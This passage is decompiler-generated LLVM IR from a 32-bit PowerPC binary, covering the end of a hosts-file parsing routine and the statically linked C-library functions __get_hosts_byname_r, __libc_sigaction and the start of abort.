  %v2_100130c4 = add i32 %v1_100130c4, %v1_100130b8
  %v3_100130c4 = inttoptr i32 %v2_100130c4 to i16*
  %v4_100130c4 = load i16, i16* %v3_100130c4, align 2
  %v1_100130c8 = and i16 %v4_100130c4, 32
  %v3_100130c8.not = icmp ne i16 %v1_100130c8, 0
  %brmerge = or i1 %v3_100130bc, %v3_100130c8.not
  br i1 %brmerge, label %dec_label_pc_100130e0, label %dec_label_pc_100130ac

dec_label_pc_100130d8:                            ; preds = %dec_label_pc_100130f4
  %v0_100130d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_100130d8 = trunc i32 %v0_100130d8 to i8
  store i8 %v1_100130d8, i8* %v1_100130e0, align 1
  %v0_100130dc = load i32, i32* %r3.global-to-local, align 4
  %v1_100130dc = add i32 %v0_100130dc, 1
  store i32 %v1_100130dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100130e0

dec_label_pc_100130e0:                            ; preds = %dec_label_pc_100130c4, %dec_label_pc_100130b0, %dec_label_pc_100130d8
  %v0_1001310c = phi i32 [ %v1_100130dc, %dec_label_pc_100130d8 ], [ %v0_100130ac, %dec_label_pc_100130b0 ], [ %v0_100130ac, %dec_label_pc_100130c4 ]
  %v1_100130e0 = inttoptr i32 %v0_1001310c to i8*
  %v2_100130e0 = load i8, i8* %v1_100130e0, align 1
  %v3_100130e0 = zext i8 %v2_100130e0 to i32
  %v3_100130e4 = icmp eq i8 %v2_100130e0, 0
  %v1_100130e8 = mul nuw nsw i32 %v3_100130e0, 2
  store i32 %v1_100130e8, i32* %r11.global-to-local, align 4
  br i1 %v3_100130e4, label %dec_label_pc_10013108, label %dec_label_pc_100130f4

dec_label_pc_100130f4:                            ; preds = %dec_label_pc_100130e0
  %v3_100130ec = icmp eq i8 %v2_100130e0, 10
  %v3_100130f4 = load i32, i32* @global_var_10028798, align 4
  %v2_100130f8 = add i32 %v3_100130f4, %v1_100130e8
  %v3_100130f8 = inttoptr i32 %v2_100130f8 to i16*
  %v4_100130f8 = load i16, i16* %v3_100130f8, align 2
  %v1_100130fc = and i16 %v4_100130f8, 32
  %v3_100130fc.not = icmp ne i16 %v1_100130fc, 0
  %brmerge27 = or i1 %v3_100130ec, %v3_100130fc.not
  br i1 %brmerge27, label %dec_label_pc_100130d8, label %dec_label_pc_10013108

dec_label_pc_10013108:                            ; preds = %dec_label_pc_100130f4, %dec_label_pc_100130e0
  %v0_10013108 = load i32, i32* @r27, align 4
  %v1_10013108 = add i32 %v0_10013108, 1
  store i32 %v1_10013108, i32* @r27, align 4
  %v2_1001310c = load i8, i8* %v1_100130e0, align 1
  %v3_10013110 = icmp eq i8 %v2_1001310c, 0
  br i1 %v3_10013110, label %dec_label_pc_10013120, label %dec_label_pc_10013118

dec_label_pc_10013118:                            ; preds = %dec_label_pc_10013084, %dec_label_pc_10013108
  %v0_100130a4 = phi i32 [ %v0_1001310c, %dec_label_pc_10013108 ], [ %v0_1001310c9, %dec_label_pc_10013084 ]
  %v0_10013098 = phi i32 [ %v1_10013108, %dec_label_pc_10013108 ], [ 0, %dec_label_pc_10013084 ]
  %tmp33 = icmp slt i32 %v0_10013098, 5
  br i1 %tmp33, label %dec_label_pc_10013098, label %dec_label_pc_10013120

dec_label_pc_10013120:                            ; preds = %dec_label_pc_10013108, %dec_label_pc_10013118, %dec_label_pc_10013084
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_100181c0.717 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_10013134 = call i32 @__GI_strcoll(i8* %v3_10013134, i32 ptrtoint ([11 x i8]* @global_var_100181c0.717 to i32))
  store i32 %v4_10013134, i32* %r3.global-to-local, align 4
  %v3_10013138 = icmp eq i32 %v4_10013134, 0
  br i1 %v3_10013138, label %dec_label_pc_10013164, label %dec_label_pc_10013188

dec_label_pc_10013144:                            ; preds = %dec_label_pc_1001317c
  %v1_10013144 = add i32 %v2_1001316c, 24
  %v2_10013144 = inttoptr i32 %v1_10013144 to i32*
  %v3_10013144 = load i32, i32* %v2_10013144, align 4
  store i32 %v3_10013144, i32* %r3.global-to-local, align 4
  store i32 268513612, i32* @lr, align 4
  %v1_10013148 = call i32 @__GI_strdup(i32 %v3_10013144)
  store i32 %v1_10013148, i32* %r3.global-to-local, align 4
  %v0_10013150 = load i32, i32* @r29, align 4
  %v1_10013150 = add i32 %v0_10013150, 1
  store i32 %v1_10013150, i32* %r11.global-to-local, align 4
  %v1_10013154 = mul i32 %v0_10013150, 4
  store i32 %v1_10013150, i32* @global_var_1002883c.650, align 4
  %v3_10013160 = add i32 %v1_10013154, ptrtoint (i32* @global_var_1002eb38.651 to i32)
  %v4_10013160 = inttoptr i32 %v3_10013160 to i32*
  store i32 %v1_10013148, i32* %v4_10013160, align 4
  br label %dec_label_pc_10013164

dec_label_pc_10013164:                            ; preds = %dec_label_pc_10013120, %dec_label_pc_10013144
  %v0_10013164 = load i32, i32* @r31, align 4
  %v1_10013164 = load i32, i32* @r27, align 4
  %v2_10013164 = icmp slt i32 %v0_10013164, %v1_10013164
  %v1_10013168 = mul i32 %v0_10013164, 4
  %v0_1001316c = load i32, i32* @r1, align 4
  %v2_1001316c = add i32 %v0_1001316c, %v1_10013168
  br i1 %v2_10013164, label %dec_label_pc_1001317c, label %dec_label_pc_10013188

dec_label_pc_1001317c:                            ; preds = %dec_label_pc_10013164
  %v3_1001317c = load i32, i32* @global_var_1002883c.650, align 4
  %tmp35 = icmp slt i32 %v3_1001317c, 3
  br i1 %tmp35, label %dec_label_pc_10013144, label %dec_label_pc_10013188

dec_label_pc_10013188:                            ; preds = %dec_label_pc_1001317c, %dec_label_pc_10013164, %dec_label_pc_10013120
  %v0_1001318c = load i32, i32* @r30, align 4
  store i32 %v0_1001318c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_100181cc.718 to i32), i32* @r4, align 4
  %v3_10013194 = inttoptr i32 %v0_1001318c to i8*
  %v4_10013194 = call i32 @__GI_strcoll(i8* %v3_10013194, i32 ptrtoint ([7 x i8]* @global_var_100181cc.718 to i32))
  store i32 %v4_10013194, i32* %r3.global-to-local, align 4
  %v3_10013198 = icmp eq i32 %v4_10013194, 0
  br i1 %v3_10013198, label %dec_label_pc_100131d8.preheader, label %dec_label_pc_100131a0

dec_label_pc_100131a0:                            ; preds = %dec_label_pc_10013188
  %v0_100131a4 = load i32, i32* @r30, align 4
  store i32 %v0_100131a4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_100181d4.719 to i32), i32* @r4, align 4
  %v3_100131ac = inttoptr i32 %v0_100131a4 to i8*
  %v4_100131ac = call i32 @__GI_strcoll(i8* %v3_100131ac, i32 ptrtoint ([7 x i8]* @global_var_100181d4.719 to i32))
  store i32 %v4_100131ac, i32* %r3.global-to-local, align 4
  %v3_100131b0 = icmp eq i32 %v4_100131ac, 0
  br i1 %v3_100131b0, label %dec_label_pc_100131d8.preheader, label %dec_label_pc_10013244.backedge

dec_label_pc_100131d8.preheader:                  ; preds = %dec_label_pc_10013188, %dec_label_pc_100131a0
  store i32 ptrtoint (i32* @global_var_1002eb28.706 to i32), i32* @r31, align 4
  %v3_100131e441 = load i32, i32* @global_var_10028840.704, align 4
  %v2_100131e843 = icmp sgt i32 %v3_100131e441, 0
  %v1_100131ec45 = add i32 %v3_100131e441, -1
  %v1_100131f046 = mul i32 %v1_100131ec45, 4
  store i32 %v1_100131f046, i32* %r11.global-to-local, align 4
  br i1 %v2_100131e843, label %dec_label_pc_100131bc, label %dec_label_pc_100131f8

dec_label_pc_100131bc:                            ; preds = %dec_label_pc_100131d8.preheader, %dec_label_pc_100131bc
  %v1_100131f048 = phi i32 [ %v1_100131f0, %dec_label_pc_100131bc ], [ %v1_100131f046, %dec_label_pc_100131d8.preheader ]
  %v1_100131ec47 = phi i32 [ %v1_100131ec, %dec_label_pc_100131bc ], [ %v1_100131ec45, %dec_label_pc_100131d8.preheader ]
  %v2_100131bc = add i32 %v1_100131f048, ptrtoint (i32* @global_var_1002eb28.706 to i32)
  %v3_100131bc = inttoptr i32 %v2_100131bc to i32*
  %v4_100131bc = load i32, i32* %v3_100131bc, align 4
  store i32 %v4_100131bc, i32* @r3, align 4
  store i32 %v1_100131ec47, i32* @global_var_10028840.704, align 4
  store i32 268513736, i32* @lr, align 4
  %v0_100131c4 = call i32 @free()
  store i32 %v0_100131c4, i32* %r3.global-to-local, align 4
  %v3_100131c8 = load i32, i32* @global_var_10028840.704, align 4
  %v1_100131d0 = mul i32 %v3_100131c8, 4
  %v1_100131d4 = load i32, i32* @r31, align 4
  %v3_100131d4 = add i32 %v1_100131d4, %v1_100131d0
  %v4_100131d4 = inttoptr i32 %v3_100131d4 to i32*
  store i32 0, i32* %v4_100131d4, align 4
  store i32 ptrtoint (i32* @global_var_1002eb28.706 to i32), i32* @r31, align 4
  %v3_100131e4 = load i32, i32* @global_var_10028840.704, align 4
  %v2_100131e8 = icmp sgt i32 %v3_100131e4, 0
  %v1_100131ec = add i32 %v3_100131e4, -1
  %v1_100131f0 = mul i32 %v1_100131ec, 4
  store i32 %v1_100131f0, i32* %r11.global-to-local, align 4
  br i1 %v2_100131e8, label %dec_label_pc_100131bc, label %dec_label_pc_100131f8

dec_label_pc_100131f8:                            ; preds = %dec_label_pc_100131bc, %dec_label_pc_100131d8.preheader
  %v3_1001323859 = phi i32 [ %v3_100131e441, %dec_label_pc_100131d8.preheader ], [ %v3_100131e4, %dec_label_pc_100131bc ]
  %v1_1001322049 = load i32, i32* @r27, align 4
  %v2_1001322050 = icmp sgt i32 %v1_1001322049, 1
  %v0_1001322853 = load i32, i32* @r1, align 4
  %v2_1001322854 = add i32 %v0_1001322853, 4
  br i1 %v2_1001322050, label %dec_label_pc_10013238, label %dec_label_pc_10013244.backedge

dec_label_pc_10013200:                            ; preds = %dec_label_pc_10013238
  %v1_10013200 = add i32 %v2_1001322855, 24
  %v2_10013200 = inttoptr i32 %v1_10013200 to i32*
  %v3_10013200 = load i32, i32* %v2_10013200, align 4
  store i32 %v3_10013200, i32* %r3.global-to-local, align 4
  store i32 268513800, i32* @lr, align 4
  %v1_10013204 = call i32 @__GI_strdup(i32 %v3_10013200)
  store i32 %v1_10013204, i32* %r3.global-to-local, align 4
  %v0_1001320c = load i32, i32* @r29, align 4
  %v1_1001320c = add i32 %v0_1001320c, 1
  store i32 %v1_1001320c, i32* %r11.global-to-local, align 4
  %v1_10013210 = mul i32 %v0_1001320c, 4
  store i32 %v1_1001320c, i32* @global_var_10028840.704, align 4
  %v3_1001321c = add i32 %v1_10013210, ptrtoint (i32* @global_var_1002eb28.706 to i32)
  %v4_1001321c = inttoptr i32 %v3_1001321c to i32*
  store i32 %v1_10013204, i32* %v4_1001321c, align 4
  %v0_10013220.pre = load i32, i32* @r31, align 4
  %v1_10013220 = load i32, i32* @r27, align 4
  %v2_10013220 = icmp slt i32 %v0_10013220.pre, %v1_10013220
  br i1 %v2_10013220, label %dec_label_pc_10013200.dec_label_pc_10013238_crit_edge, label %dec_label_pc_10013244.backedge

dec_label_pc_10013200.dec_label_pc_10013238_crit_edge: ; preds = %dec_label_pc_10013200
  %v0_10013228 = load i32, i32* @r1, align 4
  %v1_10013224 = mul i32 %v0_10013220.pre, 4
  %v2_10013228 = add i32 %v0_10013228, %v1_10013224
  %v3_10013238.pre = load i32, i32* @global_var_10028840.704, align 4
  br label %dec_label_pc_10013238

dec_label_pc_10013238:                            ; preds = %dec_label_pc_100131f8, %dec_label_pc_10013200.dec_label_pc_10013238_crit_edge
  %v3_10013238 = phi i32 [ %v3_10013238.pre, %dec_label_pc_10013200.dec_label_pc_10013238_crit_edge ], [ %v3_1001323859, %dec_label_pc_100131f8 ]
  %v2_1001322855 = phi i32 [ %v2_10013228, %dec_label_pc_10013200.dec_label_pc_10013238_crit_edge ], [ %v2_1001322854, %dec_label_pc_100131f8 ]
  %tmp37 = icmp slt i32 %v3_10013238, 4
  br i1 %tmp37, label %dec_label_pc_10013200, label %dec_label_pc_10013244.backedge

dec_label_pc_10013244:                            ; preds = %dec_label_pc_10013244.backedge, %dec_label_pc_10013244.preheader
  %v0_10013250 = phi i32 [ %v0_10013250.pre, %dec_label_pc_10013244.backedge ], [ %v0_1001325016, %dec_label_pc_10013244.preheader ]
  store i32 %v2_10013244, i32* %r3.global-to-local, align 4
  store i32 268513880, i32* @lr, align 4
  %v3_10013254 = call i32 @fgets(i32 %v2_10013244, i32 128, i32 %v0_10013250)
  store i32 %v3_10013254, i32* %r3.global-to-local, align 4
  %v3_10013258 = icmp eq i32 %v3_10013254, 0
  br i1 %v3_10013258, label %dec_label_pc_10013268, label %dec_label_pc_10013050.preheader

dec_label_pc_10013050.preheader:                  ; preds = %dec_label_pc_10013244
  store i32 %v2_10013244, i32* %r3.global-to-local, align 4
  %v2_100130503 = load i8, i8* %v1_100130502, align 4
  %v3_100130504 = zext i8 %v2_100130503 to i32
  store i32 %v3_100130504, i32* %r11.global-to-local, align 4
  %v3_100130586 = icmp eq i8 %v2_100130503, 0
  br i1 %v3_100130586, label %dec_label_pc_10013244.backedge, label %dec_label_pc_10013064.lr.ph

dec_label_pc_10013064.lr.ph:                      ; preds = %dec_label_pc_10013050.preheader
  %v3_10013064.pre = load i32, i32* @global_var_10028798, align 4
  br label %dec_label_pc_10013064

dec_label_pc_10013268:                            ; preds = %dec_label_pc_10013244
  %v0_10013268 = load i32, i32* @r26, align 4
  store i32 %v0_10013268, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10013270.720 to i32), i32* @lr, align 4
  %v1_1001326c = inttoptr i32 %v0_10013268 to i16*
  %v2_1001326c = call i32 @__GI_fclose(i16* %v1_1001326c)
  store i32 %v2_1001326c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013280

dec_label_pc_10013274:                            ; preds = %dec_label_pc_10013030
  %v0_10013274 = call i32 @__GI___h_errno_location()
  store i32 %v0_10013274, i32* %r3.global-to-local, align 4
  %v2_1001327c = inttoptr i32 %v0_10013274 to i32*
  store i32 3, i32* %v2_1001327c, align 4
  br label %dec_label_pc_10013280

dec_label_pc_10013280:                            ; preds = %entry, %dec_label_pc_10013268, %dec_label_pc_10013274
  store i32 %v2_10012fec, i32* @r3, align 4
  %v0_10013288 = call i32 @__pthread_return_void()
  store i32 %v0_10013288, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013288

; uselistorder directives
  uselistorder i32 %v3_100130504, { 2, 0, 1 }
  uselistorder i32 %v1_100131f046, { 1, 0 }
  uselistorder i32 %v1_100131ec45, { 1, 0 }
  uselistorder i32 %v0_10013098, { 1, 0 }
  uselistorder i32 %v1_100130e8, { 1, 0 }
  uselistorder i8* %v1_100130e0, { 0, 2, 1 }
  uselistorder i8 %v2_100130b0, { 2, 0, 1 }
  uselistorder i32 %v0_100130ac, { 0, 1, 3, 2 }
  uselistorder i32 %v3_10013050, { 1, 0, 2 }
  uselistorder i32 %v1_1001304c, { 0, 2, 1 }
  uselistorder i32 %v2_10013244, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10012fec, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 1, 21, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 0, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ()* @free, { 18, 15, 14, 13, 12, 11, 10, 9, 23, 22, 8, 7, 6, 5, 4, 17, 16, 19, 21, 20, 2, 3, 1, 0 }
  uselistorder i32* @global_var_10028840.704, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_1002eb28.706 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1002eb38.651 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10028758.649 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_10013280, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013238, { 1, 0 }
  uselistorder label %dec_label_pc_100131bc, { 1, 0 }
  uselistorder label %dec_label_pc_100131d8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10013164, { 1, 0 }
  uselistorder label %dec_label_pc_10013120, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013118, { 1, 0 }
  uselistorder label %dec_label_pc_100130e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100130b0, { 1, 0 }
  uselistorder label %dec_label_pc_10013244.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_10013244.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_100132a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268514020, i32* @lr, align 4
  %v9_100132e0 = inttoptr i32 %arg3 to i32*
  %v10_100132e0 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_100132e0, i32 %arg4, i32 %arg5, i32 %v4_100132a4, i32 %arg7)
  ret i32 %v10_100132e0
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_100132fc = load i32, i32* @lr, align 4
  store i32 %v0_100132fc, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10013308 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_10013318 = add i32 %tmp, 4
  store i32 %v1_10013318, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_10013320 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_10013320, i32* @r3, align 4
  br i1 %v3_10013308, label %dec_label_pc_10013348, label %dec_label_pc_10013328

dec_label_pc_10013328:                            ; preds = %entry
  %v2_10013328 = load i32, i32* %arg2, align 4
  store i32 %v2_10013328, i32* %r0.global-to-local, align 4
  store i32 268514100, i32* @lr, align 4
  %v0_10013330 = call i32 @memcpy()
  %v0_10013334 = load i32, i32* @r31, align 4
  %v1_10013334 = add i32 %v0_10013334, 132
  %v2_10013334 = inttoptr i32 %v1_10013334 to i32*
  %v3_10013334 = load i32, i32* %v2_10013334, align 4
  store i32 %v3_10013334, i32* %r0.global-to-local, align 4
  %v1_10013340 = add i32 %v0_10013334, 136
  %v2_10013340 = inttoptr i32 %v1_10013340 to i32*
  %v3_10013340 = load i32, i32* %v2_10013340, align 4
  store i32 %v3_10013340, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10013348

dec_label_pc_10013348:                            ; preds = %entry, %dec_label_pc_10013328
  store i32 268514152, i32* @lr, align 4
  %v0_10013364 = call i32 @__syscall_rt_sigaction()
  %v0_10013368 = load i32, i32* %r30.global-to-local, align 4
  %v3_10013368 = icmp eq i32 %v0_10013368, 0
  store i32 %v0_10013364, i32* @r31, align 4
  br i1 %v3_10013368, label %dec_label_pc_100133a4, label %dec_label_pc_10013378

dec_label_pc_10013378:                            ; preds = %dec_label_pc_10013348
  %v1_10013370 = icmp slt i32 %v0_10013364, 0
  %v1_10013378 = add i32 %v0_10013368, 4
  store i32 %v1_10013378, i32* @r3, align 4
  %v2_1001337c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1001337c, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_10013370, label %dec_label_pc_100133a4, label %dec_label_pc_10013388

dec_label_pc_10013388:                            ; preds = %dec_label_pc_10013378
  %v3_10013388 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_10013388, i32* %r0.global-to-local, align 4
  %v2_1001338c = inttoptr i32 %v0_10013368 to i32*
  store i32 %v3_10013388, i32* %v2_1001338c, align 4
  store i32 268514196, i32* @lr, align 4
  %v0_10013390 = call i32 @memcpy()
  %v1_1001339c = load i32, i32* %r30.global-to-local, align 4
  %v2_1001339c = add i32 %v1_1001339c, 136
  %v3_1001339c = inttoptr i32 %v2_1001339c to i32*
  %v0_100133a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100133a0 = load i32, i32* %r30.global-to-local, align 4
  %v2_100133a0 = add i32 %v1_100133a0, 132
  %v3_100133a0 = inttoptr i32 %v2_100133a0 to i32*
  store i32 %v0_100133a0, i32* %v3_100133a0, align 4
  %v0_100133a8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100133a4

dec_label_pc_100133a4:                            ; preds = %dec_label_pc_10013378, %dec_label_pc_10013348, %dec_label_pc_10013388
  %v0_100133a8 = phi i32 [ %v0_10013364, %dec_label_pc_10013378 ], [ %v0_10013364, %dec_label_pc_10013348 ], [ %v0_100133a8.pre, %dec_label_pc_10013388 ]
  store i32 %v0_100132fc, i32* %r0.global-to-local, align 4
  ret i32 %v0_100133a8

; uselistorder directives
  uselistorder i32 %v0_10013364, { 0, 1, 3, 2 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_100133a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10013348, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_100133f0.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_100133d4 = call i32 @__pthread_return_0()
  %v2_100133dc = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_100133dc, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_100133f433 = add i32 %v2_100133dc, 124
  %v4_100133f434 = inttoptr i32 %v3_100133f433 to i32*
  store i32 0, i32* %v4_100133f434, align 4
  %v0_100133f835 = load i32, i32* %r9.global-to-local, align 4
  %v1_100133f836 = add i32 %v0_100133f835, -1
  store i32 %v1_100133f836, i32* %r9.global-to-local, align 4
  %v0_100133fc37 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100133fc38 = add i32 %v0_100133fc37, -1
  store i32 %v1_100133fc38, i32* %ctr.global-to-local, align 4
  %v2_100133fc39 = icmp eq i32 %v1_100133fc38, 0
  br i1 %v2_100133fc39, label %dec_label_pc_10013400, label %dec_label_pc_100133f0.dec_label_pc_100133f0_crit_edge

dec_label_pc_100133f0.dec_label_pc_100133f0_crit_edge: ; preds = %dec_label_pc_100133f0.lr.ph, %dec_label_pc_100133f0.dec_label_pc_100133f0_crit_edge
  %v1_100133f840 = phi i32 [ %v1_100133f8, %dec_label_pc_100133f0.dec_label_pc_100133f0_crit_edge ], [ %v1_100133f836, %dec_label_pc_100133f0.lr.ph ]
  %v0_100133f4.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_100133f4.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_100133f0 = mul i32 %v1_100133f840, 4
  %v3_100133f4 = add i32 %v1_100133f0, %v1_100133f4.pre
  %v4_100133f4 = inttoptr i32 %v3_100133f4 to i32*
  store i32 %v0_100133f4.pre, i32* %v4_100133f4, align 4
  %v0_100133f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100133f8 = add i32 %v0_100133f8, -1
  store i32 %v1_100133f8, i32* %r9.global-to-local, align 4
  %v0_100133fc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100133fc = add i32 %v0_100133fc, -1
  store i32 %v1_100133fc, i32* %ctr.global-to-local, align 4
  %v2_100133fc = icmp eq i32 %v1_100133fc, 0
  br i1 %v2_100133fc, label %dec_label_pc_10013400, label %dec_label_pc_100133f0.dec_label_pc_100133f0_crit_edge

dec_label_pc_10013400:                            ; preds = %dec_label_pc_100133f0.dec_label_pc_100133f0_crit_edge, %dec_label_pc_100133f0.lr.ph
  store i32 %v2_100133dc, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_10013408 = call i32 @__sigaddset()
  %v3_1001340c = icmp eq i32 %v0_10013408, 0
  br i1 %v3_1001340c, label %dec_label_pc_10013414, label %dec_label_pc_10013424

dec_label_pc_10013414:                            ; preds = %dec_label_pc_10013400
  store i32 268514340, i32* @lr, align 4
  %v3_10013420 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_100133dc, i32 0)
  br label %dec_label_pc_10013424

dec_label_pc_10013424:                            ; preds = %dec_label_pc_10013400, %dec_label_pc_10013414
  store i32 268632064, i32* %r9.global-to-local, align 4
  %v3_10013428 = load i32, i32* @global_var_10028844.724, align 4
  %v3_1001342c = icmp eq i32 %v3_10013428, 0
  br i1 %v3_1001342c, label %dec_label_pc_10013434, label %dec_label_pc_1001345c

dec_label_pc_10013434:                            ; preds = %dec_label_pc_10013424
  store i32 1, i32* @global_var_10028844.724, align 4
  br label %dec_label_pc_1001343c

dec_label_pc_1001343c:                            ; preds = %dec_label_pc_100134b8, %dec_label_pc_10013434
  store i32 ptrtoint (i32* @global_var_10028770.722 to i32), i32* %r29.global-to-local, align 4
  %v0_10013448 = call i32 @__pthread_return_0()
  store i32 268514388, i32* @lr, align 4
  %v1_10013450 = call i32 @__raise(i32 6)
  %v0_10013458 = call i32 @__pthread_return_0()
  %v3_10013460.pre = load i32, i32* @global_var_10028844.724, align 4
  br label %dec_label_pc_1001345c

dec_label_pc_1001345c:                            ; preds = %dec_label_pc_10013424, %dec_label_pc_1001343c
  %v0_100134d4 = phi i32 [ %v3_10013428, %dec_label_pc_10013424 ], [ %v3_10013460.pre, %dec_label_pc_1001343c ]
  store i32 268632064, i32* %r9.global-to-local, align 4
  %v3_10013464 = icmp eq i32 %v0_100134d4, 1
  br i1 %v3_10013464, label %dec_label_pc_100134a4.lr.ph, label %dec_label_pc_100134d4

dec_label_pc_100134a4.lr.ph:                      ; preds = %dec_label_pc_1001345c
  %v2_10013470 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_10028844.724, align 4
  store i32 ptrtoint (i32* @global_var_10013484.726 to i32), i32* @lr, align 4
  %v3_10013480 = call i32 @__GI_memset(i32 %v2_10013470, i32 0, i32 140)
  store i32 %v2_100133dc, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_100133f433, i32* %r9.global-to-local, align 4
  %v2_100134ac25 = add i32 %v2_100133dc, 256
  %v3_100134ac26 = inttoptr i32 %v2_100134ac25 to i32*
  store i32 -1, i32* %v3_100134ac26, align 4
  %v0_100134b027 = load i32, i32* %r11.global-to-local, align 4
  %v1_100134b028 = add i32 %v0_100134b027, -1
  store i32 %v1_100134b028, i32* %r11.global-to-local, align 4
  %v0_100134b429 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100134b430 = add i32 %v0_100134b429, -1
  store i32 %v1_100134b430, i32* %ctr.global-to-local, align 4
  %v2_100134b431 = icmp eq i32 %v1_100134b430, 0
  br i1 %v2_100134b431, label %dec_label_pc_100134b8, label %dec_label_pc_100134a4.dec_label_pc_100134a4_crit_edge

dec_label_pc_100134a4.dec_label_pc_100134a4_crit_edge: ; preds = %dec_label_pc_100134a4.lr.ph, %dec_label_pc_100134a4.dec_label_pc_100134a4_crit_edge
  %v1_100134b032 = phi i32 [ %v1_100134b0, %dec_label_pc_100134a4.dec_label_pc_100134a4_crit_edge ], [ %v1_100134b028, %dec_label_pc_100134a4.lr.ph ]
  %v1_100134a8.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_100134ac.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_100134a4 = mul i32 %v1_100134b032, 4
  %v2_100134a8 = add i32 %v1_100134a4, %v1_100134a8.pre
  store i32 %v2_100134a8, i32* %r9.global-to-local, align 4
  %v2_100134ac = add i32 %v2_100134a8, 132
  %v3_100134ac = inttoptr i32 %v2_100134ac to i32*
  store i32 %v0_100134ac.pre, i32* %v3_100134ac, align 4
  %v0_100134b0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100134b0 = add i32 %v0_100134b0, -1
  store i32 %v1_100134b0, i32* %r11.global-to-local, align 4
  %v0_100134b4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100134b4 = add i32 %v0_100134b4, -1
  store i32 %v1_100134b4, i32* %ctr.global-to-local, align 4
  %v2_100134b4 = icmp eq i32 %v1_100134b4, 0
  br i1 %v2_100134b4, label %dec_label_pc_100134b8, label %dec_label_pc_100134a4.dec_label_pc_100134a4_crit_edge

dec_label_pc_100134b8:                            ; preds = %dec_label_pc_100134a4.dec_label_pc_100134a4_crit_edge, %dec_label_pc_100134a4.lr.ph
